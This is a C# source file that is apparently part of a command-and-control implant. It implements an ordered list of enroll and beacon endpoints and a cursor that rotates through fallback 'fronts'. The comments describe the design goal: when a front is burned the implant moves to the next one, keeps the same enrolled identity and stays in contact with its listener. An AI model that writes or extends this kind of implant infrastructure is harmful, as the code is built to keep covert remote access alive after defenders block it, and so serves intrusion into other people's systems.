namespace Rod.Implant.Internal;

// The egress walk (architecture.md Sec 8): the ordered endpoint list baked
// into the profile -- the primary first, then its fallbacks -- plus the cursor
// into it. Enroll retries and failed beacon cycles both advance the cursor, so
// a burned front moves the implant to the next entry instead of silencing it.
// The walk never touches identity: the implant presents the same enrolled leaf
// on every entry, so whichever front answers, the listener sees the same
// implant.

/// <summary>
/// One egress path: the enroll endpoint and the beacon host it implies. The
/// primary entry may carry an explicit beacon host (the enroll and beacon
/// hosts differ, the dev split-socket shape); a fallback entry derives its
/// beacon host from its own enroll URL, the single-front deployment shape.
/// </summary>
internal readonly record struct EgressEntry(string EnrollUrl, string BeaconUrl);

/// <summary>
/// The cursor over the baked endpoint list. Constructed once from the parsed
/// config, shared by the enroll client and the beacon loop so the walk state
/// survives the enroll-to-beacon handoff: the entry that answered enroll is
/// the entry the first beacon cycle dials.
/// </summary>
internal sealed class EgressEndpoints
{
    private readonly IReadOnlyList<EgressEntry> _entries;

    private EgressEndpoints(IReadOnlyList<EgressEntry> entries)
    {
        _entries = entries;
    }

    /// <summary>The zero-based cursor: which entry the next attempt dials.</summary>
    public int Index { get; private set; }

    /// <summary>How many entries the walk holds (always at least the primary).</summary>
    public int Count => _entries.Count;

    /// <summary>The enroll endpoint the next attempt uses.</summary>
    public string CurrentEnrollUrl => _entries[Index].EnrollUrl;

    /// <summary>The beacon host the next check-in cycle dials.</summary>
    public string CurrentBeaconUrl => _entries[Index].BeaconUrl;

    /// <summary>
    /// Moves to the next entry, wrapping to the primary after the last -- the
    /// whole list is retried in order, so a primary that comes back is picked
    /// up again on a later lap. A single-entry list is a no-op; there is
    /// nowhere to go.
    /// </summary>
    public void Advance()
    {
        if (_entries.Count > 1)
            Index = (Index + 1) % _entries.Count;
    }

    /// <summary>
    /// Composes the walk off a parsed config: the primary enroll endpoint
    /// (with its explicit beacon host when configured) followed by each
    /// fallback with its derived beacon host.
    /// </summary>
    public static EgressEndpoints Of(Config config)
    {
        var primaryBeacon = config.BeaconURL.Length > 0
            ? config.BeaconURL
            : Endpoints.BeaconUrlFromEnroll(config.EnrollURL);
        var entries = new List<EgressEntry> { new(config.EnrollURL, primaryBeacon) };
        foreach (var fallback in config.FallbackEnrollURLs)
            entries.Add(new EgressEntry(fallback, Endpoints.BeaconUrlFromEnroll(fallback)));
        return new EgressEndpoints(entries);
    }
}
